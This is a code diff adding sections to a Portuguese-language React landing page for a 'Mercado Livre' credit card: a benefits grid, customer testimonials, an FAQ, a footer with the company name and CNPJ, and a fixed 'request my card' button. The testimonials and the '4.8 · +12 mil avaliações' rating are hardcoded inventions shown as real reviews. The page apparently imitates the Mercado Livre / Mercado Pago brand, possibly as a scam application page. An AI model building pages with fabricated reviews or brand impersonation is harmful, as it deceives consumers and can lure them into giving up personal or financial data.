@@ -267,16 +267,109 @@ function Index() {
           </div>
         </div>
 
+        {/* Benefícios */}
+        <div className="px-4 mt-6">
+          <div className="bg-white rounded-2xl shadow-md p-5">
+            <h2 className="text-lg font-bold text-gray-900 text-center mb-4">Benefícios do seu cartão</h2>
+            <div className="grid grid-cols-2 gap-3">
+              {[
+                { icon: "fa-circle-xmark", title: "Sem anuidade", desc: "Zero taxa anual" },
+                { icon: "fa-coins", title: "Cashback", desc: "Em compras ML" },
+                { icon: "fa-percent", title: "Descontos", desc: "Mercado Livre" },
+                { icon: "fa-calendar-days", title: "Parcele em até 12x", desc: "Sem juros" },
+              ].map((b) => (
+                <div key={b.title} className="border border-gray-100 rounded-xl p-3 flex items-start gap-2.5">
+                  <div className="w-9 h-9 rounded-full bg-[#EAF2FE] flex items-center justify-center shrink-0">
+                    <i className={`fa-solid ${b.icon} text-[#3483FA]`} />
+                  </div>
+                  <div>
+                    <p className="text-sm font-bold text-gray-900 leading-tight">{b.title}</p>
+                    <p className="text-[11px] text-gray-500 mt-0.5">{b.desc}</p>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
 
+        {/* Depoimentos */}
+        <div className="px-4 mt-6">
+          <div className="bg-white rounded-2xl shadow-md p-5">
+            <h2 className="text-lg font-bold text-gray-900 text-center mb-1">O que dizem nossos clientes</h2>
+            <div className="flex items-center justify-center gap-1 text-yellow-400 mb-4">
+              {[...Array(5)].map((_, i) => <i key={i} className="fa-solid fa-star text-xs" />)}
+              <span className="text-xs text-gray-600 ml-1 font-medium">4.8 · +12 mil avaliações</span>
+            </div>
+            <div className="space-y-3">
+              {[
+                { name: "Mariana S.", city: "São Paulo, SP", text: "Pedi e em 3 dias o cartão chegou em casa. Super fácil!" },
+                { name: "Carlos R.", city: "Rio de Janeiro, RJ", text: "Aprovação foi rápida mesmo, sem burocracia nenhuma." },
+                { name: "Juliana P.", city: "Belo Horizonte, MG", text: "Adorei o cashback nas compras do Mercado Livre." },
+              ].map((d) => (
+                <div key={d.name} className="border border-gray-100 rounded-xl p-3">
+                  <div className="flex items-center gap-2 mb-1.5">
+                    <div className="w-8 h-8 rounded-full bg-[#3483FA] text-white flex items-center justify-center font-bold text-xs">
+                      {d.name.charAt(0)}
+                    </div>
+                    <div>
+                      <p className="text-sm font-bold text-gray-900 leading-tight">{d.name}</p>
+                      <p className="text-[10px] text-gray-500">{d.city}</p>
+                    </div>
+                    <div className="ml-auto flex gap-0.5 text-yellow-400">
+                      {[...Array(5)].map((_, i) => <i key={i} className="fa-solid fa-star text-[10px]" />)}
+                    </div>
+                  </div>
+                  <p className="text-xs text-gray-700 leading-relaxed">"{d.text}"</p>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+
+        {/* FAQ */}
+        <div className="px-4 mt-6">
+          <div className="bg-white rounded-2xl shadow-md p-5">
+            <h2 className="text-lg font-bold text-gray-900 text-center mb-4">Perguntas frequentes</h2>
+            <div className="space-y-2">
+              {[
+                { q: "O cartão tem anuidade?", a: "Não. O cartão Mercado Livre é 100% livre de anuidade." },
+                { q: "Em quanto tempo recebo o cartão?", a: "Após a aprovação, o cartão chega em até 7 dias úteis no seu endereço." },
+                { q: "Preciso ter conta no Mercado Livre?", a: "Sim, é necessário ter cadastro ativo no Mercado Livre ou Mercado Pago." },
+                { q: "Como faço para cancelar?", a: "O cancelamento pode ser feito a qualquer momento pelo app, sem taxas." },
+              ].map((item, i) => (
+                <details key={i} className="group border border-gray-100 rounded-xl px-3 py-2.5">
+                  <summary className="flex items-center justify-between cursor-pointer text-sm font-semibold text-gray-900 list-none">
+                    <span>{item.q}</span>
+                    <i className="fa-solid fa-chevron-down text-xs text-gray-500 group-open:rotate-180 transition-transform" />
+                  </summary>
+                  <p className="text-xs text-gray-600 mt-2 leading-relaxed">{item.a}</p>
+                </details>
+              ))}
+            </div>
+          </div>
+        </div>
 
         {/* Footer */}
-        <div className="px-4 pb-6">
+        <div className="px-4 pt-6 pb-28">
           <div className="text-center text-xs text-gray-500">
             <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
             <p>CNPJ: 10.573.521/0001-91</p>
           </div>
         </div>
       </div>
+
+      {/* CTA fixo no rodapé */}
+      <div className="fixed bottom-0 left-0 right-0 z-40 bg-white border-t border-gray-200 shadow-[0_-4px_12px_rgba(0,0,0,0.08)]">
+        <div className="max-w-md mx-auto px-4 py-3">
+          <button
+            onClick={handleCTA}
+            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-base font-semibold py-3.5 rounded-md transition-all"
+          >
+            Solicitar meu cartão agora
+          </button>
+        </div>
+      </div>
+
     </div>
   );
 }
